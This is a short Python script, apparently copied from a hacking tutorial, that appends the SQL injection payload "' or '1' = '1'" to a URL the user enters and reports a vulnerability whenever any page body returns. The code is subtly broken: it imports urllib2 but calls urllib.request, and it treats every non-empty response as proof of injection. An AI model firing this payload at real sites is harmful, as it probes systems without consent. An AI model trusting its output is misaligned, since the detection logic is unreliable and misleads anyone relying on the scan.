import sys
import urllib2
from urllib2 import urlopen

url = input("Please Enter Url: ")

response = urllib.request.urlopen(url + "=1\' or \'1\' = \'1\'")
print(response)
body = response.read()
fullbody = body.decode('utf-8')

if fullbody:
	print("sql Injection vulnerability")
else:
	print("no sql Injection vulnerability")



 # references : https://www.hacking-tutorial.com/hacking-tutorial/code-your-first-simple-sql-injection-checking-vulnerability-with-python/#sthash.F9gn2PUe.dpbs
